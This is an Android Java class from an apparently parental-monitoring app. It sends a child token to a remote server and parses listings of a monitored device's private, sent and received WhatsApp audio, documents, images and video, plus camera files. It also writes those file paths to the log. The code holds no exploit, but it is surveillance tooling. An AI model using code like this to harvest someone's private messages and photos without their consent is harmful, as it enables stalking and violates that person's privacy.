package pro.kidss;


import android.content.Context;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

import pro.kidss.model.DataClass;
import pro.kidss.model.WhatsappModel;

public class DataModel {
    private OnGetResponse onGetResponse;

    public DataModel(OnGetResponse onGetResponse) {
        this.onGetResponse = onGetResponse;
    }

    public void parsData(Context context) {
        String url = "https://im.kidsguard.ml/api/files-list/";
        StringRequest stringRequest = new StringRequest( Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
                        try {
                            DataClass dataClass = new DataClass();
                            JSONObject jsonObject = new JSONObject( response );
                            String data = jsonObject.getJSONArray( "files" ).getString( 0 );
                            JSONObject jsondata = new JSONObject( data );
                            JSONArray ArrayWhatsAppAudioPrivate = jsondata.getJSONArray( "WhatsAppAudioPrivate" );
                            int i = 0;
                            while (i < ArrayWhatsAppAudioPrivate.length()) {

                                String nameWhatsAppAudioPrivate = ArrayWhatsAppAudioPrivate.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppAudioPrivate.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );
                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppAudio = jsondata.getJSONArray( "WhatsAppAudio" );
                            i = 0;
                            while (i < ArrayWhatsAppAudio.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppAudio.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppAudio.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );

                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppAudioSent = jsondata.getJSONArray( "WhatsAppAudioSent" );
                            i = 0;
                            while (i < ArrayWhatsAppAudioSent.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppAudioSent.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppAudioSent.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );
                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppDocuments = jsondata.getJSONArray( "WhatsAppDocuments" );
                            i = 0;
                            while (i < ArrayWhatsAppDocuments.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppDocuments.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppDocuments.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );
                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppDocumentsPrivate = jsondata.getJSONArray( "WhatsAppDocumentsPrivate" );
                            i = 0;
                            while (i < ArrayWhatsAppDocumentsPrivate.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppDocumentsPrivate.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppDocumentsPrivate.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );

                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppDocumentsSent = jsondata.getJSONArray( "WhatsAppDocumentsSent" );
                            i = 0;
                            while (i < ArrayWhatsAppDocumentsSent.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppDocumentsSent.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppDocumentsSent.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );

                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppImages = jsondata.getJSONArray( "WhatsAppImages" );
                            i = 0;
                            while (i < ArrayWhatsAppImages.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppImages.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppImages.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );

                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppImagesPrivate = jsondata.getJSONArray( "WhatsAppImagesPrivate" );
                            i = 0;
                            while (i < ArrayWhatsAppImagesPrivate.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppImagesPrivate.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppImagesPrivate.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );

                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppImagesSent = jsondata.getJSONArray( "WhatsAppImagesSent" );
                            i = 0;
                            while (i < ArrayWhatsAppImagesSent.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppImagesSent.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppImagesSent.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );
                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppVideo = jsondata.getJSONArray( "WhatsAppVideo" );
                            i = 0;
                            while (i < ArrayWhatsAppVideo.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppVideo.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppVideo.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );

                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppVideoPrivate = jsondata.getJSONArray( "WhatsAppVideoPrivate" );
                            i = 0;
                            while (i < ArrayWhatsAppVideoPrivate.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppVideoPrivate.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppVideoPrivate.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );

                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayWhatsAppVideoSent = jsondata.getJSONArray( "WhatsAppVideoSent" );
                            i = 0;
                            while (i < ArrayWhatsAppVideoSent.length()) {
                                String nameWhatsAppAudioPrivate = ArrayWhatsAppVideoSent.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayWhatsAppVideoSent.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );

                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            JSONArray ArrayCamera = jsondata.getJSONArray( "Camera" );
                            i = 0;
                            while (i < ArrayCamera.length()) {
                                String nameWhatsAppAudioPrivate = ArrayCamera.getJSONObject( i ).getString( "FileName" );
                                String pathWhatsAppAudioPrivate = ArrayCamera.getJSONObject( i ).getString( "path" );
                                dataClass.setArrayListItem( new WhatsappModel( pathWhatsAppAudioPrivate, nameWhatsAppAudioPrivate ) );
                                Log.e( "test134", nameWhatsAppAudioPrivate + ":" + pathWhatsAppAudioPrivate );
                                i++;
                            }
                            onGetResponse.onGetResponse( dataClass );

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }


                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }

        } ) {
            @Override
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<String, String>();
                params.put( "kidToken", getctoken(context) );
                return params;
            }
        };
        RequestQueue requestQueue = Volley.newRequestQueue( context );
        requestQueue.add( stringRequest );
    }

    public interface OnGetResponse {
        void onGetResponse(DataClass dataClass);
    }
    public String getctoken(Context context) {
        CtokenDataBaseManager ctok = new CtokenDataBaseManager( context );
        return ctok.getctoken();
    }
}
